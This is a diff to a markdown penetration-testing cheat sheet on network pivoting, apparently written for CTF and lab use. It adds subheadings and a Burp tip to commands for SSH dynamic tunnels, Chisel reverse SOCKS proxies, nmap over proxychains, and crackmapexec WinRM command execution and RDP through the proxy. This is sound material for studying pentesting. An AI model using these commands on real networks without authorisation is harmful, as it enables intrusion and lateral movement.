@@ -4,7 +4,13 @@
   * [Contents](#contents)
   * [Subnet Enumeration Commands](#subnet-enumeration-commands)
   * [ProxyChains](#proxychains)
-  * [Uploading Static Binaries](#uploading-static-binaries)    
+    + [SSH Dynamic Tunnels](#ssh-dynamic-tunnels)
+    + [Chisel](#chisel)
+    + [Nmap scan through a dynamic SOCKS proxy](#nmap-scan-through-a-dynamic-socks-proxy)
+    + [Web access:](#web-access-)
+    + [Use WinRM through proxychains](#use-winrm-through-proxychains)
+    + [RDP through ProxyChains](#rdp-through-proxychains)
+  * [Uploading Static Binaries](#uploading-static-binaries)
   
 ## Subnet Enumeration Commands    
 Build an IP list then scan using nmap over proxychains    
@@ -22,20 +28,23 @@ Windows
 ## ProxyChains    
 Use tools like ProxyChains to scan new hosts without dropping tools to disk.     
 /etc/proxychains.conf #config file. Specify SOCKS4/5 proxy    
+### SSH Dynamic Tunnels     
 Set up an SSH dynamic tunnel through a bastion host to scan an internal subnet using creds:      
 
     ssh -D 9050 user@bastion -N -f      
+### Chisel   
 Set up a reverse tunnel using [Chisel](https://github.com/jpillora/chisel):    
 (For CTFs you will most likely need the AMD64/x86_64 binary)       
 
     ./chisel server -p 8001 --reverse        #start Chisel server on attack box   
     ./chisel client 10.10.10.10:8001 R:1080:socks    #connect from to it from a client target server  
     # add 'socks5 127.0.0.1 1080 ' to /etc/proxychains.conf  
-Nmap scan through a dynamic SOCKS proxy (only -sT will work - can be a bit slow with an SSH tunnel so setting up a Chisel proxy might be a better option):       
+### Nmap scan through a dynamic SOCKS proxy  
+Only -sT will work - can be a bit slow with an SSH tunnel so setting up a Chisel proxy might be a better option:        
 
     proxychains nmap 10.10.10.10 -sT -p 80, 443     
     proxychains nmap -iL ips.txt -sT -sV   
-Web access:    
+### Web access:    
 
     Use FoxyProxy Firefox extension and add a SOCKS5 proxy 127.0.0.1:9050 to access a site through a dynamic tunnel   
 [Using Burp Through a SOCKS5 Proxy](https://dev.to/adamkatora/how-to-use-burp-suite-through-a-socks5-proxy-with-proxychains-and-chisel-507e)    
@@ -43,11 +52,14 @@ Web access:
     Use Burp Upstream Proxies feature to add SOCKS5 proxy - set FoxyProxy Firefox addon to Burp proxy     
     Burp -> Settings (upper right corner) -> Network -> Connections -> SOCKS Proxy             
     Select the option 'Override options for this project only'. Options: 127.0.0.1, 1080, use SOCKS proxy     
+    
+    Drop out of scope requests so bad DNS requests don't cause pages to load forever    
+    settings -> Project -> Scope -> Drop all out of scope requests    
 
-Use WinRM through proxychains:    
+### Use WinRM through proxychains         
 
     proxychains crackmapexec winrm 10.10.10.10 -u "USERNAME" -p "PASSWORD" -x "command"    
-RDP through ProxyChains:     
+### RDP through ProxyChains       
 
     proxychains xfreerdp /u:DOMAIN\\username /p:password /v:ip      
 
